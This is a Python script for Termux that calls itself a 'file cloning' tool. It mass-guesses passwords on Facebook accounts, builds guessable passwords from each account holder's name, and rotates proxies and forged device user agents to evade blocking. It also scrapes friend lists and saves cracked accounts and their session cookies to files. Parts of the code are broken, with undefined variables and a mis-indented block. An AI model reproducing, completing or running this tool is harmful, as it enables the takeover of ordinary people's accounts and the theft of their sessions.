#GITHUB-SHANTO-KING
#ACTIVE FILE CLONING
#ONLY ACTIVE ACCOUNT FOR GAME ACCOUNT USE FILE 10000 
#DEC-FUCK-YOUR-MOM-DON'T-BYPASS-MY-COMMAND
# =[â€¢]=[SCRIPT]=[ADMIN]=[SHANTO]=[â€¢]=
#------------------[ Install-1 ]-------------------#
import os 
#-----------------[ SHANTO-King ]-------------------# 
os.system("pkg install sox -y")
os.system("play op.mp3")
os.system("pkg install espeak")
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
import requests,zlib,platform
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON=sol()
#------------------[ USER-AGENT ]-------------------#
ua = 'Dalvik/2.1.0 (Linux; U; Android 1; CPH65673X Build/OPM4.579514.034) [FBAN/FB4A;FBAV/9699.0.0.808.9[FBAN/FB4A;FBAV/1779.0.0.88.96;[FBAN/FB4A;FBAV/9706.0.0.88.96;[FBAN/FB4A;FBAV/7398.0.0.88.96;FBBV/426492151;FBRV/0;FBPN/com.facebook.katana;FBLC/en_us;FBMF/Oppo;FBBD/Apple;FBDV/CPH65673X;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=3045,height=7743};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 11; CPH69419g Build/OPM4.579514.034) [FBAN/FB4A;FBAV/3006.0.0.808.9[FBAN/FB4A;FBAV/4762.0.0.88.96;[FBAN/FB4A;FBAV/183.0.0.88.96;[FBAN/FB4A;FBAV/6312.0.0.88.96;FBBV/5326933385;FBRV/0;FBPN/com.facebook.katana;FBLC/en_us;FBMF/Oppo;FBBD/Apple;FBDV/CPH69419g;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1162,height=2322};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 3; RMX87475l Build/OPM4.579514.034) [FBAN/FB4A;FBAV/9952.0.0.808.9[FBAN/FB4A;FBAV/3143.0.0.88.96;[FBAN/FB4A;FBAV/1701.0.0.88.96;[FBAN/FB4A;FBAV/8523.0.0.88.96;FBBV/3527577794;FBRV/0;FBPN/com.facebook.katana;FBLC/en_us;FBMF/Oppo;FBBD/Apple;FBDV/RMX87475l;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=2888,height=4755};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 18; RMX3317F Build/OPM4.579514.034) [FBAN/FB4A;FBAV/1151.0.0.808.9[FBAN/FB4A;FBAV/5421.0.0.88.96;[FBAN/FB4A;FBAV/1040.0.0.88.96;[FBAN/FB4A;FBAV/9229.0.0.88.96;FBBV/62779724758;FBRV/0;FBPN/com.facebook.katana;FBLC/en_us;FBMF/Oppo;FBBD/Apple;FBDV/RMX3317F;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=2206,height=7276};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 10; RMX11480n Build/OPM4.579514.034) [FBAN/FB4A;FBAV/3146.0.0.808.9[FBAN/FB4A;FBAV/2806.0.0.88.96;[FBAN/FB4A;FBAV/308.0.0.88.96;[FBAN/FB4A;FBAV/6587.0.0.88.96;FBBV/52811016876;FBRV/0;FBPN/com.facebook.katana;FBLC/en_us;FBMF/Oppo;FBBD/Apple;FBDV/RMX11480n;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=706,height=1174};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 13; moto g15136v Build/OPM4.579514.034) [FBAN/FB4A;FBAV/7453.0.0.808.9[FBAN/FB4A;FBAV/6167.0.0.88.96;[FBAN/FB4A;FBAV/2162.0.0.88.96;[FBAN/FB4A;FBAV/7371.0.0.88.96;FBBV/48357446201;FBRV/0;FBPN/com.facebook.katana;FBLC/en_us;FBMF/Oppo;FBBD/Apple;FBDV/moto g15136v;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=2753,height=1041};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 2; RMX22952Z Build/OPM4.579514.034) [FBAN/FB4A;FBAV/9723.0.0.808.9[FBAN/FB4A;FBAV/2927.0.0.88.96;[FBAN/FB4A;FBAV/5285.0.0.88.96;[FBAN/FB4A;FBAV/5859.0.0.88.96;FBBV/1419235172;FBRV/0;FBPN/com.facebook.katana;FBLC/en_us;FBMF/Oppo;FBBD/Apple;FBDV/RMX22952Z;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=449,height=4631};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 17; GT-15453y Build/OPM4.579514.034) [FBAN/FB4A;FBAV/8548.0.0.808.9[FBAN/FB4A;FBAV/9326.0.0.88.96;[FBAN/FB4A;FBAV/8279.0.0.88.96;[FBAN/FB4A;FBAV/4087.0.0.88.96;FBBV/50084369326;FBRV/0;FBPN/com.facebook.katana;FBLC/en_us;FBMF/Oppo;FBBD/Apple;FBDV/GT-15453y;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=2650,height=1923};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 10; RMX24382h Build/OPM4.579514.034) [FBAN/FB4A;FBAV/535.0.0.808.96[FBAN/FB4A;FBAV/7101.0.0.88.96;[FBAN/FB4A;FBAV/5435.0.0.88.96;[FBAN/FB4A;FBAV/5124.0.0.88.96;FBBV/19053648879;FBRV/0;FBPN/com.facebook.katana;FBLC/en_us;FBMF/Oppo;FBBD/Apple;FBDV/RMX24382h;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=2538,height=4864};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 15; GT-49806X Build/OPM4.579514.034) [FBAN/FB4A;FBAV/5535.0.0.808.9[FBAN/FB4A;FBAV/8838.0.0.88.96;[FBAN/FB4A;FBAV/1025.0.0.88.96;[FBAN/FB4A;FBAV/8398.0.0.88.96;FBBV/77025542825;FBRV/0;FBPN/com.facebook.katana;FBLC/en_us;FBMF/Oppo;FBBD/Apple;FBDV/GT-49806X;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=2941,height=7198};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 18; SC-99359f Build/OPM4.579514.034) [FBAN/FB4A;FBAV/4221.0.0.808.9[FBAN/FB4A;FBAV/6577.0.0.88.96;[FBAN/FB4A;FBAV/9352.0.0.88.96;[FBAN/FB4A;FBAV/7914.0.0.88.96;FBBV/36318278322;FBRV/0;FBPN/com.facebook.katana;FBLC/en_us;FBMF/Oppo;FBBD/Apple;FBDV/SC-99359f;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1637,height=1739};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 10; Redmi 14099w Build/OPM4.579514.034) [FBAN/FB4A;FBAV/4743.0.0.808.9[FBAN/FB4A;FBAV/7360.0.0.88.96;[FBAN/FB4A;FBAV/628.0.0.88.96;[FBAN/FB4A;FBAV/4448.0.0.88.96;FBBV/17141943492;FBRV/0;FBPN/com.facebook.katana;FBLC/en_us;FBMF/Oppo;FBBD/Apple;FBDV/Redmi 14099w;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=4213,height=3631};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 5; SC-76753r Build/OPM4.579514.034) [FBAN/FB4A;FBAV/589.0.0.808.96[FBAN/FB4A;FBAV/9352.0.0.88.96;[FBAN/FB4A;FBAV/4379.0.0.88.96;[FBAN/FB4A;FBAV/8738.0.0.88.96;FBBV/22243748677;FBRV/0;FBPN/com.facebook.katana;FBLC/en_us;FBMF/Oppo;FBBD/Apple;FBDV/SC-76753r;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=322,height=5573};FB_FW/1;]'
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://github.com/RJSHANTO-217/Api/blob/main/prox.txt').text
	open('.prox.txt','w').write(prox)
	
except Exception as e:
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mSHANTO')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(1000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(1000, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)
 
 
	aa='Mozilla/5.0 (iPhone; CPU iPhone OS 12_4 like Mac OS X)'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile/15E148 Safari/605.1'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(1000, 9999)
	c=random.randrange(1000, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; Linux; U; Android 8.0.0; SM-A720F Build/R16NW)'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile/SM-A720F [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
 
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/RJSHANTO-217/Ua.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
 
def back():
	login()
SHANTO="SHANTO"
imt="JENI"
ak="CLASS3-"
 
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
 
 
pwpluss,pwnya=[],[]
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
 
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def SHANTOj(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
def clear():
	os.system('clear')
def back():
	login()
	
	import getpass
 
attemps = 0
 
while attemps < 12345677901:
    username = input(' \033[0;92mEnter Username: ')
    password = input(' \033[0;93mEnter Password: ')
 
    if username == 'r' and password == 'j':
        print(' \033[0;92mYou Have Successfully Logged in.')
        break
    else:
        print(' Incorrect Pass Please Trying ')
        attemps += 1
        continue
os.system('clear')

#------------------[ MAIN ]-----------------#

def banner():
	os.system("clear")
	print (f"""
\033[1;33m  ░█▀▀▀█ ░█─░█ ─█▀▀█ ░█▄─░█ ▀▀█▀▀ ░█▀▀▀█ 
\033[1;32m  ─▀▀▀▄▄ ░█▀▀█ ░█▄▄█ ░█░█░█ ─░█── ░█──░█ 
\033[1;36m  ░█▄▄▄█ ░█─░█ ░█─░█ ░█──▀█ ─░█── ░█▄▄▄█
                                                 
\033[1;91m\033[1;41m\033[1;97m              WELCOME TO SHANTO TOOLS               \033[;0m\033[1;91m\033[1;92m
===============================================
  Auther        :  RJ SHANTO
  Facebook      :  SH AN TO 
  TOOLS         :  PRIVATE
  Version       :  V-4
  WhatsApp      :  013108682**
=============================================== \033[1;31m""")
def login():
	banner()
	SHANTOj('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
	SHANTOj('\033[0;97m===============================================')
	SHANTO= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
	if SHANTO in ['m']:
		public()
	elif SHANTO in ['1']:
		crack_file()
	elif SHANTO in ['i','0i']:
		result()
	elif SHANTO in ['2','02']:
		os.system('xdg-open https://wa.me/+8801302199806')
	elif SHANTO in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('#DONE LOGOUT ')
		exit()
	else:
		print('# SELECT CORRECTLY ')
		back()
def error():
	print(f'{k}#TRY AGAIN {u}')
	time.sleep(4)
	back()
	
def result():
	os.system('clear')
	banner()
	print(' 1. CP ACCOUNT ')
	print(' 2. OK ACCOUNT')
	print(' 0. EXIT	')
	kz = input('\n Choose : ')
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print(' File Not Found')
			time.sleep(3)
			back()
		if len(vin)==0:
			print('You Have No CP Results ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+u)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+u)
			geeh = input('\n   Choose : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' CHOOSE RIGHT OPTION ')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('FILE NOT FOUND ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'  {cpkuni[0]}  {cpkuni[1]}'
				sol().print(cpkuh,style="yellow")
				nocp +=1
			input('[ Click Enter ]')
			back()
	elif kz in ['2','02']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('File Not Found ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print(' No OK FILE HERE ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+u)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+u)
			geeh = input('\n CHOOSE : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' SELECT RIGHT OPTION ')
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('File Not Found ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f' {cpkuni[0]}  {cpkuni[1]}'
				sol().print(cpkuh,style="green")
				nocp +=1
			input('[ CLICK ENTER 2 BACK ]')
			back()
	elif kz in ['0','00']:
		back()
	else:
		print('SELECT RIGHT OPTION ')
		exit()
 
def public():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		os.system('clear')
		banner()
		jum = int(input('\x1b[1;97m [+] ENTER THE NUMBERS OF IDZ: '))
	except ValueError:
		
		back()
	if jum<1 or jum>100000000:
		
		back()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(' [] INPUT ID '+str(yz)+': ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('#TRY AGAIN ')
			os.system('clear')
	try:
		print(f' [] TOTAL ID: {P}'+str(len(id)))
		print('')
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{u}')
		back()
	except (KeyError,IOError):
		print(f'IF ID IS PUBLIC THEN TRY AGAIN WITH NEW COOKIE OTHRWISE CHECK YOUR ID LINK ')
		time.sleep(3)
		back()
		
def crack_file():
	os.system('clear')
	banner()
	os.system('espeak -a 300 " your file name"')
	print('\033[1;32m [Put File Example:  /sdcard/SHANTO.txt  Etc...]')
	o = input('\x1b[1;97m [+] INPut FILE NAME : ')
	print('')
	try:lin = open(o).read().splitlines()
	except:
		print('File Not Found')
		time.sleep(2)
		back()
	for xid in lin:
		id.append(xid)
	setting()
	
def setting():
	hu = '3'
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	print('\x1b[1;92m ACTIVE FILE\n\x1b[1;97m [1] METHOD RJ.. ')
	os.system('espeak -a 300 " 1,  method,  RJ"')
	hc = input(' CHOOSE: ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['9','09']:
		method.append('mbasic')
	else:
		method.append('mobile')
	passwrd()
	exit()
 
def passwrd():
	os.system('clear')
	banner()
	print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mTOTAL IDz :\033[0;97m '+str(len(id)))
	print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;95mCloning Speed Super Fast")
	print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mTURN ON/OFF FLIGHT MODE IN EVERY 5 MIN")
	SHANTOj(f'\033[0;97m===============================================')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(nmf)
					pwv.append('57273200')
					pwv.append(frs+'@')
					pwv.append(frs+'@123')
					pwv.append(frs+'@@')
					pwv.append(frs+'@@@')
					pwv.append(frs+'@@@@')
					pwv.append(frs+'@#')
					pwv.append(frs+'1122')
					pwv.append(frs+'12')
					pwv.append(frs+'11')
					pwv.append(frs+'111')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(nmf)
					pwv.append('57273200')
					pwv.append(frs+'@')
					pwv.append(frs+'@123')
					pwv.append(frs+'@@')
					pwv.append(frs+'@@@')
					pwv.append(frs+'@@@@')
					pwv.append(frs+'@#')
					pwv.append(frs+'1122')
					pwv.append(frs+'12')
					pwv.append(frs+'11')
					pwv.append(frs+'111')
					
				pool.submit(crack,idf,pwv)
	print('')
	SHANTOj('==========================================')
	SHANTOj('CLONING COMPLETE .......... ')
	print(f'{h}[{h}ðŸŒº{h}]{h} Your Total OK idz : {h}%s '%(ok))
	input('CLICK ENTER TO EXIT ')
		
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r{bo}[SHANTO] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}{P}[{h}• Ok {P}{bo}{ok}{P}] "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host":'mbasic.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"none","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate, sdch","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':ids,
                                'password':pas,
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'fb_api_req_friendly_name':'authenticate',
                        }
            header_freefb = {
                                'Authorization':f'OAuth {accessToken}',
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':"[FBAN/FB4A;FBAV/"+zomir+".0.0.6.119;FBBV/30034644;FBDM/{density=3.02,width=720,height=1544};FBLC/en_US;FBCR/ZONG;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/"+cph+";FBSV/12;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade = {'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'dark', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, sdch', 'accept-language': 'en-US,en;q=0.9'}
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				#SHANTO-King
				print(f'\r\033[0;94m[{time.strftime("%H:%M")}SHANTO-Cp] {idf}  {pw}\n\033[0;93 COOKIES \033[0;92m{kuki} ')     
				os.system('espeak -a 300 " C,  P"')
			    ##open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				#SHANTO-King
				print(f'\r\033[0;92m[SHANTO-OK] {idf}  {pw}\n\033[0;93mCOOKIES  \033[0;92m{kuki} ')
				print('\033[0;94m===============================================')
				os.system('espeak -a 300 " SHANTO,  Ok,  id"')
				open('OK/'+okc,'a').write(idf+' â€¢ '+pw+'\n')
				cek_apk(session,coki)
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	#----------------------------------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.system('touch prox.txt')
	except:pass
	
login()